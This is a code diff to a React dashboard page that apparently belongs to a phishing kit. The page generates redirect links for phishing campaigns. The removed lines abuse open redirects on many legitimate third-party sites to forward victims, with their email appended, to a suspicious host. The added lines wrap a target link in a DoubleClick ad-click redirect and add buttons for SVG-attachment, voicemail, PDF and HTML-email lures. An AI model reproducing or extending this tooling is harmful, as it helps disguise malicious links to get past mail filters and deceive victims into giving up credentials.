@@ -15,15 +15,12 @@ export default function RedirectsPage() {
     // In a real application, this would involve an API call to your backend
     // to generate the actual redirect URLs based on the input.
     // For now, we'll simulate some dummy URLs.
+    const encodedFrontEndLink = encodeURIComponent(frontEndLink);
+
     const dummyUrls = [
-      `https://out.arduino.ru/?baseURL=https%3A%2F%2Farduino.ru&redirect=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://wind-turbine.com/go/external/6888c8e59f5a38df3f0bf00b/artikel/5/301?redirect=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://interaction-school.com/?wptouch_switch=mobile&redirect=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://meltingthedragon.com/?wptouch_switch=mobile&redirect=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://hodgsonlegal.com/?wptouch_switch=desktop&redirect=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://m.sverigeresor.se/bridge/?url=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://www.infohakodate.com/ps/ps_search.cgi?act=jump&url=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
-      `https://darts-fan.com/redirect?url=https%3A%2F%2Fjuicily%2Epixelbloom%2Ecyou%2FqVOrxoTN%2F%23${senderEmailFormat}`,
+      `https://googleads.g.doubleclick.net/pcs/click?xai=2AtHp7SIBq9Uf7bZ&sig=HTQIzEP9DNQj[?]CYD&adurl=${encodedFrontEndLink}`,
+      `AMAZON AWS REDIRECT (COMING SOON)`,
+      `CLOUDFRONT REDIRECT (COMING SOON)`,
     ];
     setGeneratedUrls(dummyUrls);
   };
@@ -32,6 +29,16 @@ export default function RedirectsPage() {
     navigator.clipboard.writeText(generatedUrls.join('\n'));
     alert('All URLs copied to clipboard!');
   };
+
+  const handleCopyUrl = async (url: string) => {
+  try {
+    await navigator.clipboard.writeText(url);
+    alert('URL copied to clipboard!'); // You can replace this with a more sophisticated notification
+  } catch (err) {
+    console.error('Failed to copy URL: ', err);
+    alert('Failed to copy URL.');
+  }
+};
 
   const handleSvgAttachment = (originalRedirectUrl: string) => {
     // Encode the original redirect URL to be safely passed as a query parameter
@@ -66,6 +73,29 @@ export default function RedirectsPage() {
   return (
     <DashboardLayout>
       <div className="min-h-screen bg-gray-50 p-8">
+        <div className="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-md mb-6">
+          <h1 className="text-2xl font-bold text-gray-900 mb-6">PDF + Attachment Format:</h1>
+          <div className="flex flex-row gap-8">
+
+          <a href="/Attachment.pdf" target="_blank">
+                      <button
+                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200 cursor-pointer"
+                      >
+                        PDF DOCUMENT
+                      </button></a>
+          <a
+  href="/Letter.html"
+  download="Letter.html"
+>
+  <button
+    className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200 cursor-pointer"
+  >
+    HTML EMAIL CONTENT
+  </button>
+</a>
+
+                      </div>
+          </div>
         <div className="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-md">
           <h1 className="text-2xl font-bold text-gray-900 mb-6">Generate Redirect URLs</h1>
 
@@ -136,12 +166,12 @@ export default function RedirectsPage() {
                 </p>
               </div>
 
-              <ul className="divide-y divide-gray-200">
+              <div className="divide-y divide-gray-200">
                 {generatedUrls.map((url, index) => (
-                  <li key={index} className="py-4 flex justify-between items-center">
-                    <p className="text-sm text-gray-800 break-all pr-4">
-                      {index + 1}. {url}
-                    </p>
+                  <div key={index} className="py-4 flex justify-between items-center">
+                    <a href={url} target='_blank' className="text-sm underline text-blue-600 font-bold break-all pr-4">
+                        {url}
+                    </a>
                     <div className="flex space-x-2 flex-shrink-0">
                       <button
                         onClick={() => handleSvgAttachment(url)}
@@ -155,10 +185,16 @@ export default function RedirectsPage() {
                       >
                         <Mic size={14} className="mr-1" /> Voicemail
                       </button>
+                      <button
+                        onClick={() => handleCopyUrl(url)} // New copy button
+                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200"
+                      >
+                        <Copy size={14} className="mr-1" /> Copy
+                      </button>
                     </div>
-                  </li>
+                  </div>
                 ))}
-              </ul>
+              </div>
             </div>
           )}
         </div>
